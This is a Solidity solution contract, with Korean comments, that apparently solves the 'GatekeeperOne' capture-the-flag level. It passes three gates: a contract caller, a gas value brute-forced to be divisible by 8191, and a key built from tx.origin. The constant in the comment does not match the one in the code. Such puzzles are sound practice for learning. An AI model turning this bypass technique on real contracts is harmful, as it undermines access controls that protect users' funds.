// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 동작 방식 정리
 * 1. gateOne 제한자: msg.sender와 tx.origin이 일치하지 않아야함 (= 실행 주체 CA)
 * 2. gateTwo 제한자: enter 함수 실행 시점의 가스비가 8191로 나누어 떨어질 것
 * 3. gateThree 제한자: 8바이트 길이의 데이터 중 상위 2바이트와 하위 2바이트만 정해진 조건에 맞게 일치시키기
 *
 * 목표
 * 함수 제한자 모두 통과해서 enter 함수 실행하기
 *
 * 공격 방식
 * 1. gateKey를 0x10000000000000000 + uint16(uint160(tx.origin)) 으로 설정
 * 2. enter 함수 호출 시 gas 값이 8191로 나누어 떨어지도록 가스비 Brute Forcing
 */

interface GatekeeperOne {
    function enter(bytes8) external;
}

contract Solve {
    address public target;
    bytes8 public gateKey;

    constructor(address _target) {
        target = _target;
        gateKey = bytes8(0x1000000000000000 + uint16(uint160(tx.origin)));
    }

    function attack() public {
        bytes memory encodedData = abi.encodeWithSignature("enter(bytes8)", gateKey);

        for (uint256 i = 0; i < 8192; i++)
        {
            (bool result, ) = target.call{gas: 8191 * 4 + i}(encodedData);

            if (result) {
                break;
            }
        }
    }
}